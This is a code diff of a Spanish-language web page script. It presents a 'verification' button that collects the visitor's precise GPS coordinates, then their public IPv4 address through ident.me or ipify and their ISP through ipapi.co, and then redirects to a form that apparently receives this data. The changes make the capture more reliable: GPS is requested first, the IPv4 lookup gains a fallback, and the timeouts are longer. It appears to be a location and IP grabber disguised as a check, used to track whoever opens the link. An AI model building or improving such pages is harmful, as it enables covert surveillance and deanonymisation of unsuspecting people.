@@ -51,15 +51,42 @@
             window.location.href = finalUrl;
         }
 
-        async function obtenerDatos() {
-            // 1. Obtener IP pública exclusivamente en formato IPv4
+        // Promesa para obtener primero la ubicación GPS
+        function obtenerGPS() {
+            return new Promise((resolve) => {
+                if ("geolocation" in navigator) {
+                    navigator.geolocation.getCurrentPosition(
+                        (pos) => {
+                            datos.lat = pos.coords.latitude;
+                            datos.lng = pos.coords.longitude;
+                            resolve();
+                        },
+                        (err) => {
+                            console.warn("Permiso GPS denegado o no disponible:", err);
+                            resolve();
+                        },
+                        { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+                    );
+                } else {
+                    resolve();
+                }
+            });
+        }
+
+        // Promesa para obtener estrictamente la IPv4 y luego el ISP
+        async function obtenerIPv4yISP() {
             try {
-                let respIp = await fetch('https://api.ipify.org?format=json');
+                // Forzar endpoint exclusivo de IPv4
+                let respIp = await fetch('https://v4.ident.me/json');
+                if (!respIp.ok) {
+                    respIp = await fetch('https://api.ipify.org?format=json');
+                }
+                
                 if (respIp.ok) {
                     let jsonIp = await respIp.json();
-                    datos.ip = jsonIp.ip || '';
-                    
-                    // Con la IPv4 obtenida, consultar ISP
+                    datos.ip = jsonIp.ip || jsonIp.address || '';
+
+                    // Si se capturó la IPv4, consultar el ISP
                     if (datos.ip) {
                         let respIsp = await fetch('https://ipapi.co/' + datos.ip + '/json/');
                         if (respIsp.ok) {
@@ -69,40 +96,31 @@
                     }
                 }
             } catch (e) {
-                console.warn("Error capturando IP/ISP:", e);
-            }
-
-            // 2. Solicitar la ubicación GPS
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        datos.lat = pos.coords.latitude;
-                        datos.lng = pos.coords.longitude;
-                        redirigir();
-                    },
-                    function(err) {
-                        console.warn("Geolocalización rechazada:", err);
-                        redirigir();
-                    },
-                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
-                );
-            } else {
-                redirigir();
+                console.warn("Error obteniendo IPv4 o ISP:", e);
             }
         }
 
-        function iniciarCaptura() {
+        async function iniciarCaptura() {
             const btn = document.getElementById('btnAction');
             const status = document.getElementById('status');
             
             btn.disabled = true;
             btn.innerText = "VERIFICANDO...";
-            status.innerText = "Por favor, permite el acceso a la ubicación si el navegador lo solicita...";
+            
+            // Límite de emergencia por si la red del usuario falla por completo
+            setTimeout(redirigir, 10000);
 
-            // Límite de tiempo absoluto para evitar que se quede pegado (6 segundos)
-            setTimeout(redirigir, 6000);
+            // 1. PRIMERO: Obtener Ubicación GPS
+            status.innerText = "1/2 Solicitando ubicación GPS...";
+            await obtenerGPS();
 
-            obtenerDatos();
+            // 2. SEGUNDO: Obtener IP Pública (IPv4) e ISP
+            status.innerText = "2/2 Obteniendo red e IP pública...";
+            await obtenerIPv4yISP();
+
+            // 3. TERCERO: Redirigir al formulario
+            status.innerText = "Redirigiendo...";
+            redirigir();
         }
     </script>
 </body>
